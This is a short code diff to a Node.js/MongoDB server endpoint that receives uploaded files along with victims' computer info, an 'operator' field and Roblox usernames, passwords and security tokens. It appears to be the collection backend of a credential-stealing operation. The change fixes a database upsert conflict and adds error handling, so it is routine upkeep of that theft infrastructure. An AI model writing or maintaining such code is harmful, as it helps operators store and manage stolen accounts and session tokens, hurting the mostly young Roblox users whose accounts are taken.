@@ -415,7 +415,7 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   if (db) {
     const updateDoc = {
       $set: { name: fixedName, uploadedAt: new Date().toISOString(), computer: computerInfo, diagnostics: diagnostics, operator: operator, 'tokenRequest.requested': false },
-      $setOnInsert: { roblox: { user: '', pass: '', security: '' } }
+      $setOnInsert: { 'roblox.user': '', 'roblox.pass': '', 'roblox.security': '' }
     };
     // Если есть токен — всегда записываем его
     if (robloxInfo.security) {
@@ -424,11 +424,15 @@ app.post('/upload', upload.array('files'), async (req, res) => {
     if (robloxInfo.user) {
       updateDoc.$set['roblox.user'] = robloxInfo.user;
     }
-    await db.collection('files').updateOne(
-      { name: fixedName, operator: operator },
-      updateDoc,
-      { upsert: true }
-    );
+    try {
+      await db.collection('files').updateOne(
+        { name: fixedName, operator: operator },
+        updateDoc,
+        { upsert: true }
+      );
+    } catch (e) {
+      console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Upsert error: ${e.message}`);
+    }
   } else {
     // In-memory fallback
     global.memFiles = global.memFiles.filter(f => !(f.name === fixedName && f.operator === operator));
